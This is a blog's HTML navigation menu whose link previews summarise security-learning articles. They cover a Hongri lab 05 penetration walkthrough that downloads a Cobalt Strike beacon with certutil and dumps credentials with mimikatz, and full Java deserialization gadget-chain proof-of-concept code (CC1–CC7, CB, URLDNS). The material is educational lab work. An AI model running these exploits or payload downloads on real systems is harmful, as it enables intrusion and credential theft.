        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA05/" class="article-link" data-summary="红日靶场05 环境搭建 这次的靶机网卡是配置好的，非常贴心
只需要我们在虚拟网络编辑器中将NAT模式的网卡IP改为192.168.135.0即可完成网络配置
接下来直接开机即可
服务器账号密码信息：
主机 账号 密码 win7 sun\heart 123.com win7 sun\Administrator dc123.com win2008 sun\admin 2020.com 因为登录主机后会提示密码过期，所以我们更改一下密码
win7： sun\Administrator:Admin12345 win2008： sun\admin:2024.com 这里只需要用sun\Administrator登录到win7服务器手动开启web服务： 在C:\phpstudy中双击运行phpstudy.exe，并在phpstudy中点击&amp;amp;quot;启动&amp;amp;quot;即可：
然后访问一下192.168.135.150看下web服务是否启动成功：
OK成功了，准备开打
信息搜集 扫一下端口：
开启了80端口和3306端口，也就是web服务和MySQL数据库服务
先看看web服务
服务器是windows系统，是ThinkPHP V5.0服务
漏洞利用 ThinkPHP V5.0命令执行getshell 记得ThinkPHP V5.0有很多历史漏洞，搜一下：
可以RCE，直接复制payload试试：
成功RCE了，而且是admin权限，ping一下公网DNS看看能否出网：
OK，该主机可以正常出网，那么先尝试一下上线CS
上传exe上线CS 就是生成exe并上传执行即可上线，生成exe过程不做赘述
通过如下命令进行下载exe：
certutil.exe -urlcache -split -f http://192.168.135.128/beacon.exe 执行完毕，dir看看成功没：
ok下载成功了，接下来启动exe即可上线
ok成功上线了
后渗透 因为当前shell的身份是admin，所以先用mimikatz试试抓取密码
抓取到了sun.com域管理Administrator的明文密码：Admin12345
接下来就可以进行内网信息搜集：
内网信息搜集 使用port scan扫描内网网段：
">红日靶场05</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>java安全</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>java反序列化调用链</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cb%E9%93%BE/" class="article-link" data-summary="java反序列化-CB链 今天学学CB链，在CC2中我们是靠触发Comparator的compare来进行反序列化调用，还有没有类似的调用链呢
Apache Commons Beanutils Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法
简单来看，java bean就是一个属性私有、有getter和setter的类，风格和我们熟悉的面向对象差别不大
比如这个类D0g3er，其中getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）：
package com.yuy0ung; public class D0g3er { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如这样：
package com.yuy0ung; import org.apache.commons.beanutils.PropertyUtils; import java.lang.reflect.InvocationTargetException; public class TestPropertyUtils { public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException { D0g3er Yuy0ung = new D0g3er(); Yuy0ung.setName(&amp;amp;#34;Yuy0ung&amp;amp;#34;); String name = (String) PropertyUtils.getProperty(Yuy0ung,&amp;amp;#34;name&amp;amp;#34;); System.out.println(name); } } 此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值：
">Java反序列化-CB链</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1/" class="article-link" data-summary="java反序列化-CC1 cc链入门的第一条
TransformedMap链 简单分析了一手，不是特别深入，不求甚解了属于是
demo分析 先看这个demo：
package com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&amp;amp;#34;exec&amp;amp;#34;, new Class[]{String.class}, new Object[]{&amp;amp;#34;open -a calculator&amp;amp;#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(&amp;amp;#34;test&amp;amp;#34;, &amp;amp;#34;xxxx&amp;amp;#34;); } } 运行之后是可以弹出计算器的：
">Java反序列化-CC1</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2/" class="article-link" data-summary="java反序列化-CC2 在commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两个分⽀版本：
commons-collections:commons-collections
org.apache.commons:commons-collections4
这里要讲的的是commons-collections4，先前学过的经典的CC1，CC3，CC6都仍然是可以使用的，而专门针对commons-collections4的利用链有两条：CC2和CC4，这里要讲的就是CC2
经过前期几条CC链的学习，可以大致理解在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从Serializable#readObject()⽅法到Transformer#transform()⽅法的调⽤链
接下来回到CC2
PriorityQueue利⽤链 CC2中⽤到的两个关键类是：
java.util.PriorityQueue
org.apache.commons.collections4.comparators.TransformingComparator
分析一下可以发现，PriorityQueue类有readObject方法：
而TransformingComparator类中的compare方法调用了transform：
那么接下来的目标就是将这两个方法串起来，看看调用链：
上面可以看到，PriorityQueue#readObject() 中调⽤了 heapify() ⽅法，而heapify()中调⽤了siftDown() ：
siftDown()中调⽤了siftDownUsingComparator()：
siftDownUsingComparator() 中调⽤的 comparator.compare() ：
于是就连接到上⾯的 TransformingComparator 了
可以简单了解一下这个的作用：
java.util.PriorityQueue 是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有⾃⼰的优先级，节点之间按照优先级⼤⼩排序成⼀棵树
反序列化时为什么需要调⽤ heapify() ⽅法？为了反序列化后，需要恢复（换⾔之，保证）这个结构的顺序
排序是靠将⼤的元素下移实现的。 siftDown() 是将节点下移的函数，⽽ comparator.compare() ⽤来⽐较两个元素⼤⼩
TransformingComparator 实现了 java.util.Comparator 接⼝，这个接⼝⽤于定义两个对象如何进⾏⽐较。siftDownUsingComparator() 中就使⽤这个接⼝的 compare() ⽅法⽐较树的节点。
简单来说， java.util.PriorityQueue 在Java中是一个优先队列，队列中每一个元素有自己的优先级。在反序列化这个对象时，为了保证队列顺序，会进行重排序的操作，而排序就涉及到大小比较，进而执行 java.util.Comparator 接口的 compare() 方法
思路有了接下来编写POC
构造 调用transform后的调用逻辑基本不变，先创建transformer：
Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;amp;#34;getMethod&amp;amp;#34;, new Class[]{String.class, Class[].class}, new Object[]{&amp;amp;#34;getRuntime&amp;amp;#34;, new Class[0]} ), new InvokerTransformer(&amp;amp;#34;invoke&amp;amp;#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(&amp;amp;#34;exec&amp;amp;#34;, new Class[]{String.class}, new Object[]{&amp;amp;#34;open -a calculator&amp;amp;#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); 然后创建一个TransformingComparator，传入我们的transformer：
">Java反序列化-CC2</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/" class="article-link" data-summary="java反序列化链-CC3 简单理解，CC3就是CC1&#43;TemplatesImpl动态加载字节码
demo 先看cc1的简单demo：
package com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&amp;amp;#34;exec&amp;amp;#34;, new Class[]{String.class}, new Object[]{&amp;amp;#34;open -a calculator&amp;amp;#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(&amp;amp;#34;test&amp;amp;#34;, &amp;amp;#34;xxxx&amp;amp;#34;); } } 我们将其结合上动态加载字节码，就是在InvokerTransformer中做手脚：
">Java反序列化-CC3</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE-cc4/" class="article-link" data-summary="Java反序列化链-CC4 CC4也是针对org.apache.commons:commons-collections4的一条链子，本质上是在CC2的基础上修改，主要思路是使用我们在CC3提到的InstantiateTransformer来代替原本的InvokerTransformer
构造 按照上面的思路来构造：
package com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.*; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections4 { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, &amp;amp;#34;_bytecodes&amp;amp;#34;, new byte[][] {code}); setFieldValue(tmpl, &amp;amp;#34;_name&amp;amp;#34;, &amp;amp;#34;HelloTemplatesImpl&amp;amp;#34;); setFieldValue(tmpl, &amp;amp;#34;_tfactory&amp;amp;#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(tmpl); queue.add(tmpl); setFieldValue(transformerChain, &amp;amp;#34;iTransformers&amp;amp;#34;, transformers); serialize(queue); unserialize(&amp;amp;#34;ser.bin&amp;amp;#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&amp;amp;#34;ser.bin&amp;amp;#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } 成功命令执行：
">Java反序列化-CC4</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc5/" class="article-link" data-summary="java反序列化-CC5 在学习CC6的时候，我们用到了org.apache.commons.collections.keyvalue.TiedMapEntry，它的hashcode()方法调用了getValue()，而getValue()调用到了get()
我们再看一下TiedMapEntry可以发现它的toString()方法中也调用了getValue()：
而CC5就是从这个地方入手进行调用，我们可以找到一个叫做BadAttributeValueExpExceptio的方法调用了toString()，虽然这个类没有实现Serializable接口，但是其父类Exception的父类Throwable实现了Serializable接口，所以BadAttributeValueException也是可以序列化的：
在它的readObject()方法中进行了调用：
我们需要进入这个if判断条件，因为默认情况下System.getSecurityManager()为null，那么不用管了，只需要控制valObj为TiedMapEntry对象即可
同时，注意到这里还有个构造方法： 里面是个三目运算符，可以看到这里将val设置为TiedMapEntry就会立即调用TiedMapEntry#toString，我们不想让他提前触发，所以我们在实例化时先将参数设置为null：
BadAttributeValueExpException bavee = new BadAttributeValueExpException(null); 再反射修改将我们创建的TiedMapEntry传入：
TiedMapEntry tme = new TiedMapEntry(outerMap, &amp;amp;#34;Yuy0ung&amp;amp;#34;); Field val = bavee.getClass().getDeclaredField(&amp;amp;#34;val&amp;amp;#34;); val.setAccessible(true); val.set(bavee,tme); 其他部分就是CC6的逻辑，完整代码如下：
package com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;amp;#34;getMethod&amp;amp;#34;, new Class[]{String.class, Class[].class}, new Object[]{&amp;amp;#34;getRuntime&amp;amp;#34;, new Class[0]} ), new InvokerTransformer(&amp;amp;#34;invoke&amp;amp;#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(&amp;amp;#34;exec&amp;amp;#34;, new Class[]{String.class}, new Object[]{&amp;amp;#34;open -a calculator&amp;amp;#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); BadAttributeValueExpException bavee = new BadAttributeValueExpException(null); TiedMapEntry tme = new TiedMapEntry(outerMap, &amp;amp;#34;Yuy0ung&amp;amp;#34;); Field val = bavee.getClass().getDeclaredField(&amp;amp;#34;val&amp;amp;#34;); val.setAccessible(true); val.set(bavee,tme); Field f = ChainedTransformer.class.getDeclaredField(&amp;amp;#34;iTransformers&amp;amp;#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(bavee); unserialize(&amp;amp;#34;ser.bin&amp;amp;#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&amp;amp;#34;ser.bin&amp;amp;#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } 运行成功命令执行：
">Java反序列化-CC5</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6/" class="article-link" data-summary="java反序列化-CC6 学习第二条CommonsCollections的利用链
TiedMapEntry 前面已经学习了CC1，但是在Java 8u71以后CC1就失效了，因为sun.reflect.annotation.AnnotationInvocationHandler#readObject的逻辑变化了
而CC6，就算是解决了高版本java的利用问题，先看看这个p神简化版利用链：
Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() 可以看到在LazyMap到exec的利用链是没变的，改变的主要是触发LazyMap#get()的方式，来替代原本CC1中的AnnotationInvocationHandler
而这里给出的类是org.apache.commons.collections.keyvalue.TiedMapEntry，他的getValue方法中调用了get： 而他的hashCode方法就调用了getValue：
那么我们需要做的就是找到能够调用这个hashCode的地方，在ysoserial中，是利⽤ java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)最后到 TiedMapEntry#hashCode()
而p牛在 java.util.HashMap#readObject 中找到 HashMap#hash()的调⽤： 而这里的hash(key)就调用了key.hashCode()：
注意到这里的参数key，只要我们让key的值为TiedMapEntry的对象，那么最后调用的就是TiedMapEntry#hashCode()，如此就去掉了ysoserial最前⾯的两次调⽤，也能构造为完整gadget
构造 首先是LazyMap后的部分不变，这里为了防止在本地调试时就触发命令执行影响调试，所以先设置了一个fakeTransformers，等到序列化时再反射更改：
Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;amp;#34;getMethod&amp;amp;#34;, new Class[]{String.class, Class[].class}, new Object[]{&amp;amp;#34;getRuntime&amp;amp;#34;, new Class[0]} ), new InvokerTransformer(&amp;amp;#34;invoke&amp;amp;#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(&amp;amp;#34;exec&amp;amp;#34;, new Class[]{String.class}, new Object[]{&amp;amp;#34;open -a calculator&amp;amp;#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); 接下来按照TiedMapEntry的构造函数格式来创建对象：
">Java反序列化-CC6</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc7/" class="article-link" data-summary="Java反序列化-CC7 cc7的思路同样是找了另一条调用链来触发Lazy.get方法
HashTable() Hashtable 与 HashMap很相似，都是一种key-value形式的哈希表，但是还是有区别：
HashMap 与 Hashtable的父类不一样。 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。 Hashtable 的key-value 不允许为null值，但是HashMap 是允许的，后者会将 key=value的实体放在index=0 的位置。 Hashtable 线程安全，HashMap 线程不安全。 同样的，既然HashMap可以实现反序列化漏洞，Hashtable同样可以。
分析源码，这个Hashtable类可以给出两条链，分别是
readObject()中的reconstitution()的hashCode()方法 readObject()中的reconstitution()的equals()方法 hashCode链 先看一下Hashtable的readObject()方法：
最后的循环里使用了reconstitutionPut方法，将反序列化得到的key-value 放在内部实现的 Entry 数组 table里
再看看这个reconstitutionPut方法：
这里调用了key.hashCode，key同样是我们可控，那么思路就和CC6一样了，只不过是把HashMap换成了HashTable，构造一下：
package com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7_HashTable { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;amp;#34;getMethod&amp;amp;#34;, new Class[]{String.class, Class[].class}, new Object[]{&amp;amp;#34;getRuntime&amp;amp;#34;, new Class[0]} ), new InvokerTransformer(&amp;amp;#34;invoke&amp;amp;#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(&amp;amp;#34;exec&amp;amp;#34;, new Class[]{String.class}, new Object[]{&amp;amp;#34;open -a calculator&amp;amp;#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Hashtable innerTable = new Hashtable(); // Map innerMap = new HashMap(); Map outerTable = LazyMap.decorate(innerTable, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerTable, &amp;amp;#34;Yuy0ung&amp;amp;#34;); Map evilMap = new HashMap(); evilMap.put(tme,&amp;amp;#34;Yuy1ung&amp;amp;#34;); outerTable.remove(&amp;amp;#34;Yuy0ung&amp;amp;#34;); Field f = ChainedTransformer.class.getDeclaredField(&amp;amp;#34;iTransformers&amp;amp;#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(evilMap); unserialize(&amp;amp;#34;ser.bin&amp;amp;#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&amp;amp;#34;ser.bin&amp;amp;#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } 成功触发命令执行：
">Java反序列化-CC7</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/urldns%E9%93%BE/" class="article-link" data-summary="URLDNS链 概述 URLDNS链，在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞
其中 HashMap类重写了readobject 方法，readobject 方法会读取一个序列化文件流：
在 readObject 方法中的 putVal 方法会调用 hash 方法
hash 方法下会调用URL类的 hashCode 方法，当 hashCode 属性不等于-1，会调用 handler.hashCode 方法
继续跟进会调用getHostAddress 方法
最后调用InetAddress.getByName 方法触发DNS请求
payload：
package com.yuy0ung.fundamentals; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class SerializationTest { public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&amp;amp;#34;ser.bin&amp;amp;#34;)); oos.writeObject(obj); } public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { Person person = new Person(&amp;amp;#34;aa&amp;amp;#34;, 22); HashMap&amp;amp;lt;URL,Integer&amp;amp;gt; hashmap = new HashMap&amp;amp;lt;URL,Integer&amp;amp;gt;(); //为了不触发url请求，修改hashcode不是-1 URL url = new URL(&amp;amp;#34;http://187ukw81mwpvmptw82esrl8yvp1hpadz.oastify.com&amp;amp;#34;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&amp;amp;#34;hashCode&amp;amp;#34;); hashcodefield.setAccessible(true); hashcodefield.set(url,1234); hashmap.put(url, 1); //为了反序列化时触发url请求，修改hashcode为-1 hashcodefield.set(url,-1); serialize(hashmap); } } 非常简单的一条链子，没什么好说的
">URLDNS链</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>java安全基础</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-link" data-summary="java反序列化 序列化与反序列化 方便对象传输，对象与序列化字符串的转换
demo person类
package com.yuy0ung.fundamentals; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return &amp;amp;#34;Person [name=&amp;amp;#34; &#43; name &#43; &amp;amp;#34;, age=&amp;amp;#34; &#43; age &#43; &amp;amp;#34;]&amp;amp;#34;; } } 序列化：
">java反序列化</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-unsafe/" class="article-link" data-summary="java安全基础-Unsafe 全限定名为sun.misc.Unsafe，是Java底层的API提供的一个类，它提供非常底层的内存、CAS、线程程度、类、对象等操作A，是一个可以直接操作内存，不用构造器、不需要任何访问权限检查就可以创建对象的类
sun.mics.Unsafe Unsafe源码如下:
public final class Unsafe { private static final Unsafe theUnsafe; private Unsafe() { } @CallerSensitive public static Unsafe getUnsafe() { Class var0 = Reflection.getCallerClass(); // 检查调用类的加载器是不是Bootstrap，也就是null if (!VM.isSystemDomainLoader(var0.getClassLoader())) { throw new SecurityException(&amp;amp;#34;Unsafe&amp;amp;#34;); } else { return theUnsafe; } } } 上述代码可以看出，Unsafe唯一的构造器也是private，没法通过new实例化
虽然getUnsafe()是一个public方法，但是它会检查调用getUsafe()类的加载器是不是Bootstrap类加载器，但是我们定义类的默认加载器是AppClassLoader，所以会直接抛出异常。 检查类加载器代码如下：
// bootstrap加载器负责加载rt.jar，不是java编写，所以是null public static boolean isSystemDomainLoader(ClassLoader var0) { return var0 == null; } 获取Unsafe对象 虽然不能直接实例化获取Unsafe对象，但我们可以尝试通过反射从theUnsafe和构造器入手创建实例化对象：
">java安全基础-Unsafe</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" class="article-link" data-summary="java安全基础-动态加载字节码 字节码 严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中，而.class文件可以在JVM中运行
本文中所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在探讨范围内
URLClassLoader ClassLoader是来用来加载字节码文件最基础的方法，而这里的URLClassLoader可以用来远程加载字节码
正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：
URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件
URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件
URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类
这里关注第三种，远程加载的话，我们一般使用http://协议，看看下面这个demo： 首先写一个访问http://127.0.0.1:8000/test.class的程序：
package com.yuy0ung.urlclassloader; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadertest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL[] urls = {new URL(&amp;amp;#34;http://localhost:8000/&amp;amp;#34;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(&amp;amp;#34;test&amp;amp;#34;); c.newInstance(); } } 然后写一个有输出的test程序编译成class文件放在localhost:8000上：
">java安全基础-动态加载字节码</a>
        
      </div>
